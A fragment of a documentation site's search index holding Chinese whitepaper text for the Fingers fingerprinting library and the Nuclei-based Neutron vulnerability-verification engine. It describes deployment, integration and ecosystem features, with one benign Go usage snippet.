<p>\u96c6\u6210\u590d\u6742\u5ea6\u7684\u6781\u5927\u7b80\u5316    \u51e0\u884c\u4ee3\u7801\u5373\u53ef\u96c6\u6210\u5f3a\u5927\u7684\u6307\u7eb9\u8bc6\u522b\u80fd\u529b\uff0c\u663e\u8457\u964d\u4f4e\u5f00\u53d1\u95e8\u69db\u548c\u7ef4\u62a4\u6210\u672c\u3002</p> </li> <li> <p>\u8d44\u6e90\u6d88\u8017\u7684\u6700\u5c0f\u5316    \u907f\u514d\u8fdb\u7a0b\u95f4\u901a\u4fe1\u548c\u6570\u636e\u5e8f\u5217\u5316\u5f00\u9500\uff0c\u5728\u8d44\u6e90\u53d7\u9650\u73af\u5883\u4e2d\u5177\u6709\u663e\u8457\u4f18\u52bf\u3002</p> </li> </ol>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u573a\u666f\u5316\u89e3\u51b3\u65b9\u6848\u4f18\u52bf","title":"\u573a\u666f\u5316\u89e3\u51b3\u65b9\u6848\u4f18\u52bf","text":"<ol> <li> <p>\u5b9e\u6218\u5bfc\u5411\u7684\u529f\u80fd\u8bbe\u8ba1    \u9488\u5bf9\u7aef\u53e3\u626b\u63cf\u548c\u76ee\u5f55\u7206\u7834\u7684\u6df1\u5ea6\u4f18\u5316\uff0c\u8ba9\u6307\u7eb9\u8bc6\u522b\u771f\u6b63\u670d\u52a1\u4e8e\u5b9e\u9645\u5b89\u5168\u5de5\u4f5c\u3002</p> </li> <li> <p>\u5de5\u4f5c\u6d41\u7a0b\u7684\u4e00\u4f53\u5316\u6574\u5408    \u4e0d\u4ec5\u63d0\u4f9b\u8bc6\u522b\u7ed3\u679c\uff0c\u66f4\u63d0\u4f9b\u57fa\u4e8e\u6307\u7eb9\u7684\u540e\u7eed\u884c\u52a8\u5efa\u8bae\uff0c\u5f62\u6210\u5b8c\u6574\u7684\u5b89\u5168\u5de5\u4f5c\u95ed\u73af\u3002</p> </li> <li> <p>\u573a\u666f\u5316\u7684\u6027\u80fd\u4f18\u5316    \u9488\u5bf9\u4e0d\u540c\u5e94\u7528\u573a\u666f\u7684\u7279\u5b9a\u4f18\u5316\u7b56\u7565\uff0c\u5b9e\u73b0\u6700\u4f73\u7684\u6548\u7387\u548c\u51c6\u786e\u6027\u5e73\u8861\u3002</p> </li> </ol>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u751f\u6001\u7cfb\u7edf\u4f18\u52bf","title":"\u751f\u6001\u7cfb\u7edf\u4f18\u52bf","text":"<ol> <li> <p>\u6307\u7eb9\u8986\u76d6\u7684\u5168\u9762\u6027    \u7ee7\u627f\u591a\u4e2a\u793e\u533a\u6307\u7eb9\u5e93\uff0c\u5b9e\u73b0\u4e1a\u754c\u6700\u5e7f\u6cdb\u7684\u5e94\u7528\u8986\u76d6\uff0c\u663e\u8457\u964d\u4f4e\u6f0f\u62a5\u7387\u3002</p> </li> <li> <p>\u751f\u6001\u6269\u5c55\u7684\u5f00\u653e\u6027    \u5b8c\u6574\u7684\u7b2c\u4e09\u65b9\u6269\u5c55\u673a\u5236\uff0c\u652f\u6301\u793e\u533a\u8d21\u732e\u548c\u4f01\u4e1a\u5b9a\u5236\uff0c\u786e\u4fdd\u6307\u7eb9\u80fd\u529b\u7684\u6301\u7eed\u6f14\u8fdb\u3002</p> </li> <li> <p>\u6280\u672f\u6808\u7684\u73b0\u4ee3\u5316    \u57fa\u4e8e\u73b0\u4ee3\u5316\u7684\u6280\u672f\u67b6\u6784\u8bbe\u8ba1\uff0c\u652f\u6301\u4e91\u539f\u751f\u3001\u5bb9\u5668\u5316\u7b49\u65b0\u5174\u90e8\u7f72\u6a21\u5f0f\u3002</p> </li> </ol>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6280\u672f\u9886\u5148\u6027","title":"\u6280\u672f\u9886\u5148\u6027","text":"<ol> <li> <p>\u67b6\u6784\u521b\u65b0    \u4e1a\u754c\u9996\u521b\u7684\u5d4c\u5165\u5f0f\u591a\u5f15\u64ce\u878d\u5408\u67b6\u6784\uff0c\u91cd\u65b0\u5b9a\u4e49\u4e86\u6307\u7eb9\u8bc6\u522b\u7cfb\u7edf\u7684\u6280\u672f\u6807\u51c6\u3002</p> </li> <li> <p>\u6027\u80fd\u7a81\u7834    \u901a\u8fc7\u6df1\u5ea6\u4f18\u5316\u5b9e\u73b0\u7684\u6781\u81f4\u6027\u80fd\uff0c\u5728\u4fdd\u8bc1\u51c6\u786e\u6027\u7684\u524d\u63d0\u4e0b\u5b9e\u73b0\u4e1a\u754c\u9886\u5148\u7684\u8bc6\u522b\u901f\u5ea6\u3002</p> </li> <li> <p>\u6807\u51c6\u5316\u8f93\u51fa    \u57fa\u4e8eCPE\u6807\u51c6\u7684\u7edf\u4e00\u8f93\u51fa\u683c\u5f0f\uff0c\u4e3a\u5b89\u5168\u751f\u6001\u7684\u6807\u51c6\u5316\u53d1\u5c55\u505a\u51fa\u91cd\u8981\u8d21\u732e\u3002</p> </li> </ol>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6210\u672c\u6548\u76ca\u4f18\u52bf","title":"\u6210\u672c\u6548\u76ca\u4f18\u52bf","text":"<ol> <li> <p>\u90e8\u7f72\u6210\u672c    \u5355\u4e00\u5e93\u6587\u4ef6\uff0c\u96f6\u5916\u90e8\u4f9d\u8d56\uff0c\u652f\u6301\u8de8\u5e73\u53f0\u90e8\u7f72\uff0c\u663e\u8457\u964d\u4f4e\u90e8\u7f72\u548c\u7ef4\u62a4\u590d\u6742\u5ea6\u3002</p> </li> <li> <p>\u5f00\u53d1\u6210\u672c    \u7b80\u6d01\u7684API\u8bbe\u8ba1\u548c\u4e30\u5bcc\u7684\u6587\u6863\u652f\u6301\uff0c\u5927\u5e45\u964d\u4f4e\u96c6\u6210\u5f00\u53d1\u7684\u65f6\u95f4\u548c\u4eba\u529b\u6210\u672c\u3002</p> </li> <li> <p>\u8fd0\u8425\u6210\u672c    \u81ea\u52a8\u5316\u7684\u89c4\u5219\u66f4\u65b0\u548c\u667a\u80fd\u5316\u7684\u7f13\u5b58\u673a\u5236\uff0c\u51cf\u5c11\u65e5\u5e38\u7ef4\u62a4\u5de5\u4f5c\u91cf\u3002</p> </li> </ol>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5b9e\u65bd\u65b9\u6848","title":"\u5b9e\u65bd\u65b9\u6848","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u90e8\u7f72\u67b6\u6784","title":"\u90e8\u7f72\u67b6\u6784","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5355\u673a\u90e8\u7f72","title":"\u5355\u673a\u90e8\u7f72","text":"<p>\u9002\u7528\u4e8e\u5c0f\u89c4\u6a21\u73af\u5883\u548c\u6d4b\u8bd5\u573a\u666f\uff1a - \u5355\u4e00binary\u90e8\u7f72 - \u672c\u5730\u5316\u914d\u7f6e\u548c\u6570\u636e\u5b58\u50a8 - \u652f\u6301\u547d\u4ee4\u884c\u548cAPI\u8c03\u7528</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5206\u5e03\u5f0f\u90e8\u7f72","title":"\u5206\u5e03\u5f0f\u90e8\u7f72","text":"<p>\u9002\u7528\u4e8e\u5927\u89c4\u6a21\u4f01\u4e1a\u73af\u5883\uff1a - \u591a\u8282\u70b9\u96c6\u7fa4\u90e8\u7f72 - \u4e2d\u592e\u7ba1\u7406\u548c\u7ed3\u679c\u805a\u5408 - \u8d1f\u8f7d\u5747\u8861\u548c\u5bb9\u9519\u5904\u7406</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u4e91\u539f\u751f\u90e8\u7f72","title":"\u4e91\u539f\u751f\u90e8\u7f72","text":"<p>\u9002\u7528\u4e8e\u4e91\u73af\u5883\u548c\u5bb9\u5668\u5316\u573a\u666f\uff1a - Docker\u5bb9\u5668\u652f\u6301 - Kubernetes\u96c6\u7fa4\u90e8\u7f72 - \u81ea\u52a8\u6269\u7f29\u5bb9\u548c\u670d\u52a1\u53d1\u73b0</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u96c6\u6210\u65b9\u6848","title":"\u96c6\u6210\u65b9\u6848","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5d4c\u5165\u5f0f\u96c6\u6210\u652f\u6301","title":"\u5d4c\u5165\u5f0f\u96c6\u6210\u652f\u6301","text":"<p>Fingers\u4f5c\u4e3a\u5d4c\u5165\u5f0f\u6307\u7eb9\u8bc6\u522b\u5e93\uff0c\u63d0\u4f9b\u4e86\u591a\u6837\u5316\u7684\u96c6\u6210\u65b9\u5f0f\u4ee5\u6ee1\u8db3\u4e0d\u540c\u5e94\u7528\u573a\u666f\u7684\u9700\u6c42\u3002\u4f5c\u4e3a\u4e00\u4e2a\u771f\u6b63\u7684\u5d4c\u5165\u5f0f\u5e93\uff0cFingers\u4e0d\u4ec5\u652f\u6301Go\u8bed\u8a00\u7684\u539f\u751f\u96c6\u6210\uff0c\u66f4\u901a\u8fc7ABI\u63a5\u53e3\u652f\u6301\u8de8\u8bed\u8a00\u8c03\u7528\u3002</p> <p>Go SDK\u96c6\u6210\uff1a\u4f5c\u4e3a\u539f\u751fGo\u5e93\uff0cFingers\u63d0\u4f9b\u4e86\u5b8c\u6574\u7684SDK\u63a5\u53e3\u3002\u5f00\u53d1\u8005\u53ea\u9700\u51e0\u884c\u4ee3\u7801\u5373\u53ef\u4e3a\u73b0\u6709\u5de5\u5177\u96c6\u6210\u5f3a\u5927\u7684\u591a\u5f15\u64ce\u6307\u7eb9\u8bc6\u522b\u80fd\u529b\u3002SDK\u91c7\u7528\u9762\u5411\u63a5\u53e3\u7684\u8bbe\u8ba1\uff0c\u901a\u8fc7\u7b80\u6d01\u7684API\u66b4\u9732\u6838\u5fc3\u529f\u80fd\uff0c\u652f\u6301\u81ea\u5b9a\u4e49\u5f15\u64ce\u6ce8\u518c\u548c\u89c4\u5219\u6269\u5c55\u3002</p> <p>API\u63a5\u53e3\u8c03\u7528\uff1a\u63d0\u4f9bRESTful API\u63a5\u53e3\uff0c\u652f\u6301HTTP/HTTPS\u534f\u8bae\u7684\u8de8\u8bed\u8a00\u8c03\u7528\u3002API\u8bbe\u8ba1\u9075\u5faaOpenAPI\u89c4\u8303\uff0c\u652f\u6301JSON\u683c\u5f0f\u7684\u8bf7\u6c42\u54cd\u5e94\uff0c\u4fbf\u4e8e\u4e0d\u540c\u7f16\u7a0b\u8bed\u8a00\u7cfb\u7edf\u7684\u96c6\u6210\u3002</p> <p>ABI\u4e8c\u8fdb\u5236\u63a5\u53e3\uff1a\u901a\u8fc7CGO\u6280\u672f\u7f16\u8bd1\u4e3aC\u517c\u5bb9\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff08.dll/.so/.dylib\uff09\uff0c\u652f\u6301C/C++\u3001Python\u3001Java\u3001.NET\u7b49\u591a\u79cd\u8bed\u8a00\u7684\u76f4\u63a5\u8c03\u7528\u3002ABI\u63a5\u53e3\u7ecf\u8fc7\u7cbe\u5fc3\u8bbe\u8ba1\uff0c\u786e\u4fdd\u8de8\u8bed\u8a00\u8c03\u7528\u7684\u7a33\u5b9a\u6027\u548c\u6027\u80fd\u3002</p> <p>\u96c6\u6210\u793a\u4f8b\uff1a <pre><code>// Go SDK\u96c6\u6210\u793a\u4f8b\nengine, _ := fingers.NewEngine()\nresp, _ := http.Get(\"https://example.com\")\nframeworks, _ := engine.DetectResponse(resp)\nfor _, fw := range frameworks {\n    fmt.Printf(\"\u53d1\u73b0: %s %s\\n\", fw.Name, fw.Version)\n}\n</code></pre></p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#api\u96c6\u6210","title":"API\u96c6\u6210","text":"<p>\u63d0\u4f9bRESTful API\u63a5\u53e3\uff0c\u652f\u6301\u8de8\u8bed\u8a00\u8c03\u7528\u3002\u901a\u8fc7\u6807\u51c6HTTP\u534f\u8bae\uff0c\u4efb\u4f55\u7f16\u7a0b\u8bed\u8a00\u90fd\u53ef\u4ee5\u8f7b\u677e\u8c03\u7528\u6307\u7eb9\u8bc6\u522b\u670d\u52a1\uff0c\u5b9e\u73b0\u7cfb\u7edf\u95f4\u7684\u65e0\u7f1d\u96c6\u6210\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#cli\u96c6\u6210","title":"CLI\u96c6\u6210","text":"<p>\u63d0\u4f9b\u529f\u80fd\u5b8c\u6574\u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u652f\u6301\u6279\u91cf\u5904\u7406\u3001\u7ed3\u679c\u5bfc\u51fa\u3001\u81ea\u5b9a\u4e49\u914d\u7f6e\u7b49\u529f\u80fd\uff0c\u6ee1\u8db3\u4e0d\u540c\u7528\u6237\u7684\u4f7f\u7528\u4e60\u60ef\u548c\u573a\u666f\u9700\u6c42\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u914d\u7f6e\u7ba1\u7406","title":"\u914d\u7f6e\u7ba1\u7406","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5f15\u64ce\u914d\u7f6e","title":"\u5f15\u64ce\u914d\u7f6e","text":"<ul> <li>\u542f\u7528/\u7981\u7528\u7279\u5b9a\u6307\u7eb9\u5f15\u64ce</li> <li>\u8c03\u6574\u5f15\u64ce\u4f18\u5148\u7ea7\u548c\u6743\u91cd</li> <li>\u914d\u7f6e\u8d85\u65f6\u548c\u91cd\u8bd5\u53c2\u6570</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6027\u80fd\u8c03\u4f18","title":"\u6027\u80fd\u8c03\u4f18","text":"<ul> <li>\u5e76\u53d1\u6570\u91cf\u8c03\u6574</li> <li>\u7f13\u5b58\u7b56\u7565\u914d\u7f6e</li> <li>\u7f51\u7edc\u53c2\u6570\u4f18\u5316</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u8f93\u51fa\u5b9a\u5236","title":"\u8f93\u51fa\u5b9a\u5236","text":"<ul> <li>\u7ed3\u679c\u683c\u5f0f\u9009\u62e9</li> <li>\u5b57\u6bb5\u8fc7\u6ee4\u548c\u6620\u5c04</li> <li>\u62a5\u544a\u6a21\u677f\u5b9a\u5236</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u751f\u6001\u62d3\u5c55","title":"\u751f\u6001\u62d3\u5c55","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u793e\u533a\u9a71\u52a8","title":"\u793e\u533a\u9a71\u52a8","text":"<p>\u5efa\u7acb\u5b8c\u6574\u7684\u793e\u533a\u8d21\u732e\u673a\u5236\uff1a - \u4f17\u5305\u6307\u7eb9\uff1a\u793e\u533a\u7528\u6237\u5171\u540c\u7ef4\u62a4\u6307\u7eb9\u5e93 - \u8d28\u91cf\u4fdd\u8bc1\uff1a\u5efa\u7acb\u6307\u7eb9\u8d28\u91cf\u8bc4\u4f30\u548c\u5ba1\u6838\u673a\u5236 - \u77e5\u8bc6\u5171\u4eab\uff1a\u6784\u5efa\u6307\u7eb9\u8bc6\u522b\u77e5\u8bc6\u5e93\u548c\u6700\u4f73\u5b9e\u8df5</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u7ed3\u8bed","title":"\u7ed3\u8bed","text":"<p>Fingers \u591a\u5f15\u64ce\u6307\u7eb9\u8bc6\u522b\u7cfb\u7edf\u4ee3\u8868\u4e86\u6307\u7eb9\u8bc6\u522b\u6280\u672f\u53d1\u5c55\u7684\u65b0\u65b9\u5411\uff0c\u901a\u8fc7\u4e09\u5927\u5173\u952e\u7ef4\u5ea6\u7684\u521b\u65b0\u7a81\u7834\uff0c\u91cd\u65b0\u5b9a\u4e49\u4e86\u73b0\u4ee3\u6307\u7eb9\u8bc6\u522b\u7cfb\u7edf\u7684\u6280\u672f\u6807\u51c6\u3002</p> <p>**\u5d4c\u5165\u5f0f\u67b6\u6784**\u8ba9\u6307\u7eb9\u8bc6\u522b\u771f\u6b63\u6210\u4e3a\u4e86\u5b89\u5168\u5de5\u5177\u7684\u6838\u5fc3\u7ec4\u4ef6\uff0c\u800c\u975e\u5916\u90e8\u4f9d\u8d56\u3002\u6beb\u79d2\u7ea7\u7684API\u54cd\u5e94\u65f6\u95f4\u548c\u96f6\u5f00\u9500\u7684\u96c6\u6210\u65b9\u5f0f\uff0c\u4f7f\u5f97\u6307\u7eb9\u8bc6\u522b\u80fd\u529b\u80fd\u591f\u65e0\u7f1d\u878d\u5165\u5230\u4efb\u4f55\u5b89\u5168\u573a\u666f\u4e2d\uff0c\u8fd9\u662f\u6307\u7eb9\u8bc6\u522b\u6280\u672f\u53d1\u5c55\u7684\u6700\u4f73\u5b9e\u8df5\u65b9\u5411\u3002</p> <p>**\u573a\u666f\u5316\u89e3\u51b3\u65b9\u6848**\u4f53\u73b0\u4e86\u6211\u4eec\u5bf9\u5b9e\u6218\u9700\u6c42\u7684\u6df1\u523b\u7406\u89e3\u3002\u4e0d\u6ee1\u8db3\u4e8e\u4ec5\u63d0\u4f9b\u5e95\u5c42\u80fd\u529b\uff0c\u800c\u662f\u9488\u5bf9\u7aef\u53e3\u626b\u63cf\u548c\u76ee\u5f55\u7206\u7834\u7b49\u6838\u5fc3\u573a\u666f\u63d0\u4f9b\u5b8c\u6574\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u8ba9\u6307\u7eb9\u8bc6\u522b\u771f\u6b63\u670d\u52a1\u4e8e\u5b9e\u9645\u7684\u5b89\u5168\u5de5\u4f5c\uff0c\u63d0\u5347\u5b89\u5168\u4ece\u4e1a\u8005\u7684\u5de5\u4f5c\u6548\u7387\u3002</p> <p>**\u5f00\u653e\u751f\u6001\u7cfb\u7edf**\u786e\u4fdd\u4e86Fingers\u7684\u6301\u7eed\u53d1\u5c55\u548c\u6f14\u8fdb\u80fd\u529b\u3002\u901a\u8fc7\u7ee7\u627f\u591a\u4e2a\u793e\u533a\u6307\u7eb9\u5e93\uff0c\u5e76\u63d0\u4f9b\u5b8c\u6574\u7684\u7b2c\u4e09\u65b9\u6269\u5c55\u673a\u5236\uff0cFingers\u6784\u5efa\u4e86\u4e00\u4e2a\u5f00\u653e\u3001\u5305\u5bb9\u3001\u53ef\u6301\u7eed\u53d1\u5c55\u7684\u6307\u7eb9\u8bc6\u522b\u751f\u6001\uff0c\u8ba9\u6bcf\u4e2a\u7528\u6237\u90fd\u80fd\u4ece\u4e2d\u53d7\u76ca\uff0c\u4e5f\u80fd\u4e3a\u5176\u505a\u51fa\u8d21\u732e\u3002</p> <p>\u6211\u4eec\u76f8\u4fe1\uff0c\u51c6\u786e\u7684\u8d44\u4ea7\u8bc6\u522b\u662f\u5b89\u5168\u9632\u62a4\u7684\u7b2c\u4e00\u6b65\uff0c\u800c\u9ad8\u6548\u7684\u6307\u7eb9\u8bc6\u522b\u662f\u51c6\u786e\u8d44\u4ea7\u8bc6\u522b\u7684\u5173\u952e\u3002Fingers\u5c06\u6301\u7eed\u6f14\u8fdb\uff0c\u5728\u4e09\u5927\u6838\u5fc3\u7ef4\u5ea6\u4e0a\u4e0d\u65ad\u6df1\u5316\u548c\u5b8c\u5584\uff0c\u4e3a\u7f51\u7edc\u5b89\u5168\u4ece\u4e1a\u8005\u63d0\u4f9b\u6700\u5148\u8fdb\u3001\u6700\u5b9e\u7528\u7684\u6307\u7eb9\u8bc6\u522b\u80fd\u529b\uff0c\u52a9\u529b\u6784\u5efa\u66f4\u52a0\u5b89\u5168\u7684\u6570\u5b57\u4e16\u754c\u3002</p> <p>\u672a\u6765\uff0cFingers\u5c06\u7ee7\u7eed\u81f4\u529b\u4e8e\u63a8\u52a8\u6307\u7eb9\u8bc6\u522b\u6280\u672f\u7684\u6807\u51c6\u5316\u53d1\u5c55\uff0c\u6210\u4e3a\u73b0\u4ee3\u7f51\u7edc\u5b89\u5168\u4f53\u7cfb\u4e2d\u4e0d\u53ef\u6216\u7f3a\u7684\u57fa\u7840\u8bbe\u65bd\uff0c\u4e3a\u5168\u7403\u5b89\u5168\u793e\u533a\u63d0\u4f9b\u5f3a\u5927\u800c\u5f00\u653e\u7684\u6307\u7eb9\u8bc6\u522b\u5e73\u53f0\u3002</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/","title":"Neutron \u8f7b\u91cf\u7ea7\u6f0f\u6d1e\u9a8c\u8bc1\u5f15\u64ce\u767d\u76ae\u4e66","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u5728\u73b0\u4ee3\u7f51\u7edc\u5b89\u5168\u8bc4\u4f30\u4e2d\uff0c\u6f0f\u6d1e\u626b\u63cf\u548c\u9a8c\u8bc1\u662f\u8bc6\u522b\u5b89\u5168\u98ce\u9669\u7684\u5173\u952e\u73af\u8282\u3002\u7136\u800c\uff0c\u4f20\u7edf\u7684\u6f0f\u6d1e\u626b\u63cf\u5de5\u5177\u5f80\u5f80\u9762\u4e34\u7740\u4f53\u79ef\u5e9e\u5927\u3001\u6027\u80fd\u4f4e\u4e0b\u3001\u517c\u5bb9\u6027\u5dee\u7b49\u95ee\u9898\uff0c\u7279\u522b\u662f\u5728\u8d44\u6e90\u53d7\u9650\u7684\u73af\u5883\u4e2d\u96be\u4ee5\u6709\u6548\u90e8\u7f72\u3002**Neutron \u8f7b\u91cf\u7ea7\u6f0f\u6d1e\u9a8c\u8bc1\u5f15\u64ce**\u5e94\u8fd0\u800c\u751f\uff0c\u4f5c\u4e3a\u4e00\u5957\u4e13\u4e3a\u73b0\u4ee3\u5b89\u5168\u573a\u666f\u4f18\u5316\u7684\u4e0b\u4e00\u4ee3\u6f0f\u6d1e\u9a8c\u8bc1\u57fa\u7840\u8bbe\u65bd\u3002</p> <p>Neutron \u57fa\u4e8eNuclei\u5f15\u64ce\u7684\u7cbe\u534e\u90e8\u5206\u91cd\u65b0\u8bbe\u8ba1\uff0c\u5728\u4fdd\u6301\u5f3a\u5927\u529f\u80fd\u7684\u540c\u65f6\u5b9e\u73b0\u4e86\u6781\u81f4\u7684\u8f7b\u91cf\u5316\u3002\u901a\u8fc7\u53bb\u9664\u5197\u4f59\u529f\u80fd\u3001\u4f18\u5316\u6838\u5fc3\u7b97\u6cd5\u3001\u589e\u5f3a\u517c\u5bb9\u6027\uff0cNeutron \u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9ad8\u6548\u3001\u7a33\u5b9a\u3001\u6613\u4e8e\u96c6\u6210\u7684\u6f0f\u6d1e\u9a8c\u8bc1\u89e3\u51b3\u65b9\u6848\uff0c\u7279\u522b\u9002\u7528\u4e8e\u5185\u7f51\u6e17\u900f\u3001\u8d44\u6e90\u53d7\u9650\u73af\u5883\u548c\u5927\u89c4\u6a21\u81ea\u52a8\u5316\u573a\u666f\u3002</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u80cc\u666f\u4e0e\u5e02\u573a\u9700\u6c42","title":"\u80cc\u666f\u4e0e\u5e02\u573a\u9700\u6c42","text":""},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u73b0\u4ee3\u6f0f\u6d1e\u626b\u63cf\u7684\u6311\u6218","title":"\u73b0\u4ee3\u6f0f\u6d1e\u626b\u63cf\u7684\u6311\u6218","text":"<p>\u968f\u7740\u7f51\u7edc\u5b89\u5168\u5a01\u80c1\u7684\u65e5\u76ca\u590d\u6742\u5316\uff0c\u4f01\u4e1a\u5bf9\u6f0f\u6d1e\u626b\u63cf\u5de5\u5177\u63d0\u51fa\u4e86\u66f4\u9ad8\u7684\u8981\u6c42\u3002\u7136\u800c\uff0c\u73b0\u6709\u5de5\u5177\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\u66b4\u9732\u51fa\u8bf8\u591a\u95ee\u9898\uff1a</p> <ol> <li>\u4f53\u79ef\u81a8\u80c0\uff1a\u4e3b\u6d41\u6f0f\u6d1e\u626b\u63cf\u5de5\u5177\u968f\u7740\u529f\u80fd\u589e\u52a0\u4f53\u79ef\u6025\u5267\u81a8\u80c0\uff0c\u5f71\u54cd\u90e8\u7f72\u548c\u4f20\u8f93\u6548\u7387\u3002</li> <li>\u8d44\u6e90\u6d88\u8017\uff1a\u9ad8\u5185\u5b58\u548cCPU\u5360\u7528\u9650\u5236\u4e86\u5728\u8d44\u6e90\u53d7\u9650\u73af\u5883\u4e2d\u7684\u5e94\u7528\u3002</li> <li>\u517c\u5bb9\u6027\u95ee\u9898\uff1a\u65b0\u7248\u672c\u5de5\u5177\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u8981\u6c42\u8d8a\u6765\u8d8a\u9ad8\uff0c\u96be\u4ee5\u5728\u8001\u65e7\u7cfb\u7edf\u4e2d\u8fd0\u884c\u3002</li> <li>\u529f\u80fd\u5197\u4f59\uff1a\u5927\u91cf\u7528\u4e0d\u5230\u7684\u529f\u80fd\u589e\u52a0\u4e86\u5de5\u5177\u7684\u590d\u6742\u6027\u548c\u7ef4\u62a4\u6210\u672c\u3002</li> <li>\u90e8\u7f72\u56f0\u96be\uff1a\u590d\u6742\u7684\u4f9d\u8d56\u5173\u7cfb\u4f7f\u5f97\u5de5\u5177\u96be\u4ee5\u5728\u7279\u6b8a\u73af\u5883\u4e2d\u5feb\u901f\u90e8\u7f72\u3002</li> </ol>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#nuclei\u751f\u6001\u7684\u6f14\u8fdb\u4e0e\u95ee\u9898","title":"Nuclei\u751f\u6001\u7684\u6f14\u8fdb\u4e0e\u95ee\u9898","text":"<p>Nuclei\u4f5c\u4e3a\u4e1a\u754c\u9886\u5148\u7684\u6f0f\u6d1e\u626b\u63cf\u5f15\u64ce\uff0c\u62e5\u6709\u5f3a\u5927\u7684\u529f\u80fd\u548c\u5e9e\u5927\u7684\u793e\u533a\u652f\u6301\uff1a</p> <p>\u4f18\u52bf\u7279\u70b9\uff1a - \u5730\u8868\u6700\u5e9e\u5927\u7684POC\u793e\u533a\uff0820000+ templates\uff09 - \u57fa\u4e8eYAML\u7684\u6781\u7b80POC\u914d\u7f6e - \u5f3a\u5927\u7684DSL\u5f15\u64ce\u548c\u6a21\u677f\u7cfb\u7edf - \u5b8c\u5168\u5f00\u6e90\u7684\u751f\u6001\u7cfb\u7edf</p> <p>\u6f14\u8fdb\u5e26\u6765\u7684\u95ee\u9898\uff1a \u968f\u7740Nuclei\u4ecev1\u6f14\u8fdb\u5230v3\uff0c\u5f15\u5165\u4e86\u5927\u91cf\u65b0\u529f\u80fd\uff1a - JavaScript/Python Internal DSL\u5f15\u64ce - Headless\u6d4f\u89c8\u5668\u652f\u6301 - File\u3001DNS\u3001SSL\u3001WebSocket\u7b49\u65b0\u534f\u8bae - OAST Out-of-band\u670d\u52a1 - ...</p> <p>\u8fd9\u4e9b\u529f\u80fd\u6269\u5c55\u5e26\u6765\u4e86\"\u8f6f\u4ef6\u81a8\u80c0\"\u95ee\u9898\uff1a - \u4f53\u79ef\u6fc0\u589e\uff1a\u4ece\u51e0MB\u589e\u957f\u5230100MB\uff0c\u538b\u7f29\u540e\u4ecd\u8d85\u8fc710MB - 